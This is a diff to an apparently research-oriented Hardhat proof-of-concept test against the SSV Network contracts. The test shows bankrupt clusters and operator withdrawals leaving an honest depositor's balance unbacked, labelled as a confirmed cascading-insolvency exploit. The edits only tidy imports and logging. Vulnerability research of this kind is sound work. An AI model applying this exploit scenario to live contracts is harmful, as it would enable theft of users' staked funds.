@@ -3,7 +3,6 @@ import {
   initializeContract,
   registerOperators,
   bulkRegisterValidators,
-  CONFIG,
 } from './helpers/contract-helpers';
 import { mine } from '@nomicfoundation/hardhat-network-helpers';
 import { expect } from 'chai';
@@ -23,12 +22,11 @@ import { expect } from 'chai';
  * Expected Result: ~550 SSV stolen from honest users
  */
 describe('POC 2: Multi-Cluster Cascading Insolvency (ACTUAL PROTOCOL)', () => {
-  let ssvNetwork: any, ssvViews: any, ssvToken: any;
+  let ssvNetwork: any, ssvToken: any;
 
   beforeEach(async () => {
     const metadata = await initializeContract();
     ssvNetwork = metadata.ssvNetwork;
-    ssvViews = metadata.ssvNetworkViews;
     ssvToken = metadata.ssvToken;
   });
 
@@ -45,7 +43,7 @@ describe('POC 2: Multi-Cluster Cascading Insolvency (ACTUAL PROTOCOL)', () => {
     const operatorFee = 1n * 10n**18n; // 1 SSV per block
     const operatorIds = await registerOperators(0, 4, operatorFee);
     
-    console.log(`Registered 4 operators with fee: ${operatorFee / 10n**18n} SSV/block`);
+    console.log(`Registered 4 operators with fee: ${Number(operatorFee / 10n**18n)} SSV/block`);
     console.log(`Operator IDs: ${operatorIds}\n`);
 
     // ========== PHASE 2: Setup Multiple Clusters ==========
@@ -86,11 +84,11 @@ describe('POC 2: Multi-Cluster Cascading Insolvency (ACTUAL PROTOCOL)', () => {
 
     const initialPoolBalance = await ssvToken.read.balanceOf([ssvNetwork.address]);
     
-    console.log(`Cluster 1 (Large): ${depositLarge / 10n**18n} SSV (healthy)`);
-    console.log(`Cluster 2 (Small 1): ${depositSmall1 / 10n**18n} SSV (bankrupts in ~25 blocks)`);
-    console.log(`Cluster 3 (Small 2): ${depositSmall2 / 10n**18n} SSV (bankrupts in ~12 blocks)`);
-    console.log(`Cluster 4 (Small 3): ${depositSmall3 / 10n**18n} SSV (bankrupts in ~6 blocks)`);
-    console.log(`Total contract balance: ${initialPoolBalance / 10n**18n} SSV\n`);
+    console.log(`Cluster 1 (Large): ${Number(depositLarge / 10n**18n)} SSV (healthy)`);
+    console.log(`Cluster 2 (Small 1): ${Number(depositSmall1 / 10n**18n)} SSV (bankrupts in ~25 blocks)`);
+    console.log(`Cluster 3 (Small 2): ${Number(depositSmall2 / 10n**18n)} SSV (bankrupts in ~12 blocks)`);
+    console.log(`Cluster 4 (Small 3): ${Number(depositSmall3 / 10n**18n)} SSV (bankrupts in ~6 blocks)`);
+    console.log(`Total contract balance: ${Number(initialPoolBalance / 10n**18n)} SSV\n`);
 
     // ========== PHASE 3: Time Passes - Cascading Bankruptcies ==========
     console.log('--- PHASE 3: Simulating 150 Blocks (Cascading Bankruptcies) ---\n');
@@ -139,15 +137,15 @@ describe('POC 2: Multi-Cluster Cascading Insolvency (ACTUAL PROTOCOL)', () => {
     const contractBalanceAfterWithdrawals = await ssvToken.read.balanceOf([ssvNetwork.address]);
     const totalWithdrawn = contractBalanceBeforeWithdrawals - contractBalanceAfterWithdrawals;
 
-    console.log(`Contract balance before withdrawals: ${contractBalanceBeforeWithdrawals / 10n**18n} SSV`);
-    console.log(`Total operator withdrawals: ${totalWithdrawn / 10n**18n} SSV`);
-    console.log(`Contract balance after withdrawals: ${contractBalanceAfterWithdrawals / 10n**18n} SSV\n`);
+    console.log(`Contract balance before withdrawals: ${Number(contractBalanceBeforeWithdrawals / 10n**18n)} SSV`);
+    console.log(`Total operator withdrawals: ${Number(totalWithdrawn / 10n**18n)} SSV`);
+    console.log(`Contract balance after withdrawals: ${Number(contractBalanceAfterWithdrawals / 10n**18n)} SSV\n`);
 
     // ========== PHASE 5: Honest User Attempts Withdrawal ==========
     console.log('--- PHASE 5: Honest Large User Attempts Withdrawal ---\n');
 
-    console.log(`Large user is entitled to: ${depositLarge / 10n**18n} SSV`);
-    console.log(`Contract has: ${contractBalanceAfterWithdrawals / 10n**18n} SSV`);
+    console.log(`Large user is entitled to: ${Number(depositLarge / 10n**18n)} SSV`);
+    console.log(`Contract has: ${Number(contractBalanceAfterWithdrawals / 10n**18n)} SSV`);
 
     // Calculate the deficit
     const deficit = depositLarge - contractBalanceAfterWithdrawals;
@@ -156,7 +154,7 @@ describe('POC 2: Multi-Cluster Cascading Insolvency (ACTUAL PROTOCOL)', () => {
       console.log('\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
       console.log('VULNERABILITY CONFIRMED: CASCADING INSOLVENCY!');
       console.log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
-      console.log(`\nLARGE USER LOSS: ${deficit / 10n**18n} SSV`);
+      console.log(`\nLARGE USER LOSS: ${Number(deficit / 10n**18n)} SSV`);
       console.log('\nThree bankrupt clusters created COMPOUNDING virtual debt.');
       console.log('Operators withdrew this unbacked debt as REAL tokens.');
       console.log('The deficit was STOLEN from the honest large depositor!');
@@ -168,11 +166,11 @@ describe('POC 2: Multi-Cluster Cascading Insolvency (ACTUAL PROTOCOL)', () => {
     console.log('=================================================================');
     console.log('EXPLOIT SUMMARY');
     console.log('=================================================================');
-    console.log(`Initial Pool: ${initialPoolBalance / 10n**18n} SSV`);
-    console.log(`Operator Withdrawals: ${totalWithdrawn / 10n**18n} SSV`);
-    console.log(`Remaining Pool: ${contractBalanceAfterWithdrawals / 10n**18n} SSV`);
-    console.log(`Large User Entitlement: ${depositLarge / 10n**18n} SSV`);
-    console.log(`Large User Loss: ${deficit / 10n**18n} SSV`);
+    console.log(`Initial Pool: ${Number(initialPoolBalance / 10n**18n)} SSV`);
+    console.log(`Operator Withdrawals: ${Number(totalWithdrawn / 10n**18n)} SSV`);
+    console.log(`Remaining Pool: ${Number(contractBalanceAfterWithdrawals / 10n**18n)} SSV`);
+    console.log(`Large User Entitlement: ${Number(depositLarge / 10n**18n)} SSV`);
+    console.log(`Large User Loss: ${Number(deficit / 10n**18n)} SSV`);
     console.log(`Bankrupt Clusters: 3`);
     console.log('=================================================================\n');
 
